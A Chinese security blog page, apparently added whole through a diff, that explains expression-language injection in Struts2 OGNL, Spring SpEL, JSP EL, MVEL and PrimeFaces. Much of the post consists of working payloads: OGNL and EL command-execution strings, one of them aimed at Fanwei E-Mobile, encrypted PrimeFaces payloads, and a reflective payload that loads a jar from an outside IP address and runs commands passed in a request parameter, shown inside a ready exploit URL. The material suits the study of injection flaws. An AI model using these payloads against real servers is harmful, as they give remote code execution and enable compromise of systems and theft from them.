@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=8.8.8" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=8.8.8">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=8.8.8">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=8.8.8">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=8.8.8" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地做一份相关文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词">
+<meta name="keywords" content="web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="表达式注入">
+<meta property="og:url" content="https://misakitoto.github.io/2018/09/18/表达式注入/index.html">
+<meta property="og:site_name" content="Misaki&#39;s Blog">
+<meta property="og:description" content="在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地做一份相关文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://misakitoto.github.io/2018/09/18/表达式注入/1.png">
+<meta property="og:image" content="https://misakitoto.github.io/2018/09/18/表达式注入/2.png">
+<meta property="og:image" content="https://misakitoto.github.io/2018/09/18/表达式注入/3.png">
+<meta property="og:image" content="https://misakitoto.github.io/2018/09/18/表达式注入/4.png">
+<meta property="og:image" content="https://misakitoto.github.io/2018/09/18/表达式注入/5.png">
+<meta property="og:updated_time" content="2018-09-18T10:37:33.766Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="表达式注入">
+<meta name="twitter:description" content="在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地做一份相关文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词">
+<meta name="twitter:image" content="https://misakitoto.github.io/2018/09/18/表达式注入/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '8.8.8',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'MISAKI'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://misakitoto.github.io/2018/09/18/表达式注入/"/>
+
+
+
+
+
+  <title>表达式注入 | Misaki's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/MisakiToto" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Misaki's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://misakitoto.github.io/2018/09/18/表达式注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Misaki">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Misaki's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">表达式注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-18T12:29:45+08:00">
+                2018-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地做一份相关文档和记录</p>
+<h1 id="表达式注入概念："><a href="#表达式注入概念：" class="headerlink" title="表达式注入概念："></a>表达式注入概念：</h1><p>2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。</p>
+<p>而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。<br><a id="more"></a></p>
+<h1 id="流行的表达式语言："><a href="#流行的表达式语言：" class="headerlink" title="流行的表达式语言："></a>流行的表达式语言：</h1><h2 id="Struts2——OGNL"><a href="#Struts2——OGNL" class="headerlink" title="Struts2——OGNL"></a>Struts2——OGNL</h2><p>实至名归的“漏洞之王”，目前被攻防双方理解得足够透彻的唯一表达式语言。</p>
+<p>表达式的格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">​      @[类全名（包括包路径）]@[方法名 |  值名]，例如：</span><br><span class="line"></span><br><span class="line">​             @java.lang.String@format(&apos;foo %s&apos;, &apos;bar&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>基本用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line"></span><br><span class="line">ActionContext AC = ActionContext.getContext();</span><br><span class="line"></span><br><span class="line">Map Parameters = (Map)AC.getParameters();</span><br><span class="line"></span><br><span class="line">String expression = &quot;$&#123;(new java.lang.ProcessBuilder(&apos;calc&apos;)).start()&#125;&quot;;</span><br><span class="line"></span><br><span class="line">AC.getValueStack().findValue(expression));</span><br></pre></td></tr></table></figure></p>
+<p>相关漏洞：</p>
+<p>s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017</p>
+<h2 id="Spring——SPEL"><a href="#Spring——SPEL" class="headerlink" title="Spring——SPEL"></a>Spring——SPEL</h2><p>SPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。</p>
+<p>基本用法：</p>
+<p>在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line"></span><br><span class="line">String expression = &quot;T(java.lang.Runtime).getRuntime().exec(/&quot;calc/&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">String result = parser.parseExpression(expression).getValue().toString();</span><br></pre></td></tr></table></figure></p>
+<h2 id="JSP——JSTL-EL"><a href="#JSP——JSTL-EL" class="headerlink" title="JSP——JSTL_EL"></a>JSP——JSTL_EL</h2><p>这种表达式是JSP语言自带的表达式，也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用。</p>
+<p>基本用法：</p>
+<p>jsp  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;spring:message text=&quot;$&#123;/&quot;/&quot;.getClass().forName(/&quot;java.lang.Runtime/&quot;).getMethod(/&quot;getRuntime/&quot;,null).invoke(null,null).exec(/&quot;calc/&quot;,null).toString()&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Elasticsearch——MVEL"><a href="#Elasticsearch——MVEL" class="headerlink" title="Elasticsearch——MVEL"></a>Elasticsearch——MVEL</h2><p>Elasticsearch的CVE-2014-3120这个漏洞</p>
+<p>MVEL是同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能。</p>
+<p>基本用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">java import org.mvel.MVEL;  </span><br><span class="line"></span><br><span class="line">public class MVELTest &#123;  </span><br><span class="line"></span><br><span class="line">​        public static void main(String[] args) &#123;  </span><br><span class="line"></span><br><span class="line">​              String expression = &quot;new java.lang.ProcessBuilder(/&quot;calc/&quot;).start();&quot;;  </span><br><span class="line"></span><br><span class="line">​               Boolean result = (Boolean) MVEL.eval(expression, vars);  </span><br><span class="line"></span><br><span class="line">​         &#125;  </span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="执行代码："><a href="#执行代码：" class="headerlink" title="执行代码："></a>执行代码：</h1><h2 id="OGNL表达式注入："><a href="#OGNL表达式注入：" class="headerlink" title="OGNL表达式注入："></a>OGNL表达式注入：</h2><p>示例：泛微E-Mobile</p>
+<p>表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。</p>
+<p><img src="/2018/09/18/表达式注入/1.png" alt="img"></p>
+<p>先用一个小的加减乘除做验证：</p>
+<p><img src="/2018/09/18/表达式注入/2.png" alt="img"></p>
+<p>执行exp语句，执行命令whoami，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())：</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/09/18/表达式注入/3.png" alt="img"></p>
+<p>尝试报路径，但此例并不成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br></pre></td></tr></table></figure></p>
+<h2 id="EL表达式注入："><a href="#EL表达式注入：" class="headerlink" title="EL表达式注入："></a>EL表达式注入：</h2><p>​    实例：CVE-2011-2730</p>
+<p>　　EL表达式语句在执行时，会调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应对象，找不到则返回”” （注意，不是null，而是空字符串）。</p>
+<p>EL表达式可以很轻松获取JavaBean的属性，或获取数组、Collection、Map类型集合的数据</p>
+<p>EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。</p>
+<p>语法：${隐式对象名称}：获得对象的引用</p>
+<p>序号       隐含对象名称        描述</p>
+<p>1     pageContext     对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）</p>
+<p>2     pageScope        代表page域中用于保存属性的Map对象</p>
+<p>3     requestScope     代表request域中用于保存属性的Map对象</p>
+<p>4     sessionScope     代表session域中用于保存属性的Map对象</p>
+<p>5     applicationScope  代表application域中用于保存属性的Map对象</p>
+<p>6     param            表示一个保存了所有请求参数的Map对象</p>
+<p>7     paramValues     表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[]</p>
+<p>8     header           表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”]</p>
+<p>9     headerValues     表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”]</p>
+<p>10   cookie            表示一个保存了所有cookie的Map对象</p>
+<p>11   initParam          表示一个保存了所有web应用初始化参数的map对象</p>
+<p>语法：${运算表达式}，EL表达式支持如下运算符：</p>
+<p>　1、关系运算符</p>
+<p><img src="/2018/09/18/表达式注入/4.png" alt="img"></p>
+<p>　2、逻辑运算符：</p>
+<p><img src="/2018/09/18/表达式注入/5.png" alt="img"></p>
+<p>　3、empty运算符：检查对象是否为null(空)</p>
+<p>　4、二元表达式：${user!=null?user.name :””}<br> 　5、[ ] 和 . 号运算符</p>
+<p>执行exp语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Primefaces框架表达式注入"><a href="#Primefaces框架表达式注入" class="headerlink" title="Primefaces框架表达式注入:"></a>Primefaces框架表达式注入:</h2><p>Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密!</p>
+<p>命令：java -cp .\de.jar test.EncodeDecode exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">验证(代码):</span><br><span class="line"></span><br><span class="line">$&#123;facesContext.getExternalContext().getResponse().getWriter().println(&quot;~~~elinject~~~&quot;)&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().flush()&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line">加密的Payload:</span><br><span class="line"></span><br><span class="line">uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5+OpbBXfBSKlTh7gJWI1HR5e/f4ZjcLzobfbDkQghTWQVAXvhdUc8D7M8Nnr+gSpk0we/YPtcrOOmI+/uuxl31mfOtFvEWGE3AUZFGxpmyfyMuGL0rzVw3wUpjUlHw4k3O4pm1RrCJT/PxEtCs00U9EBM2okSaAdPIn9p9G5X3lwi6lN7MXvoBhoFVy+31JzmoVeaZattVJhqvZRs1fguZGDCqQaJe+c6rQmcZWEKQg==</span><br><span class="line"></span><br><span class="line">Web路径:</span><br><span class="line"></span><br><span class="line">$&#123;facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(/&quot;//&quot;))&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().flush()&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p>加密的Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D</span><br></pre></td></tr></table></figure>
+<p>反射式调用执行命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;request.getSession().setAttribute(&quot;list&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())&#125;$&#123;request.getSession().getAttribute(&quot;list&quot;).add(request.getSession().getServletContext().getResource(&quot;/&quot;).toURI().create(&quot;http://118.184.23.145/cmd.jar&quot;).toURL())&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute(&quot;list&quot;).toArray(request.session.servletContext.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;org.javaweb.test.HelloWorld&quot;).newInstance().exec(request.getParameter(&quot;cmd&quot;)))&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().flush()&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p>加密的Payload调用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&amp;;ln=primefaces&amp;;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&amp;;cmd=ifconfig</span><br></pre></td></tr></table></figure>
+<h2 id="Spring-Boot框架表达式注入"><a href="#Spring-Boot框架表达式注入" class="headerlink" title="Spring Boot框架表达式注入"></a>Spring Boot框架表达式注入</h2><p>漏洞影响Spring Boot版本从1.1-1.3.0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8555/test.php?id=$&#123;new%20java.lang.String(new%20byte[]&#123;101, 108, 105, 110, 106, 101, 99, 116 &#125;)&#125;</span><br></pre></td></tr></table></figure>
+<p>内容中出现 elinject就是注入成功</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/18/新的开始！/" rel="next" title="新的开始！">
+                <i class="fa fa-chevron-left"></i> 新的开始！
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/18/对意外发现的某站点测试/" rel="prev" title="对意外发现的某站点测试">
+                对意外发现的某站点测试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Misaki" />
+            
+              <p class="site-author-name" itemprop="name">Misaki</p>
+              <p class="site-description motion-element" itemprop="description">One way to choose one !</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/MisakiToto" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.freebuf.com" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.t00ls.net/members-profile-12179.html" target="_blank" title="Tools">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Tools</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#表达式注入概念："><span class="nav-number">1.</span> <span class="nav-text">表达式注入概念：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#流行的表达式语言："><span class="nav-number">2.</span> <span class="nav-text">流行的表达式语言：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Struts2——OGNL"><span class="nav-number">2.1.</span> <span class="nav-text">Struts2——OGNL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring——SPEL"><span class="nav-number">2.2.</span> <span class="nav-text">Spring——SPEL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSP——JSTL-EL"><span class="nav-number">2.3.</span> <span class="nav-text">JSP——JSTL_EL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elasticsearch——MVEL"><span class="nav-number">2.4.</span> <span class="nav-text">Elasticsearch——MVEL</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 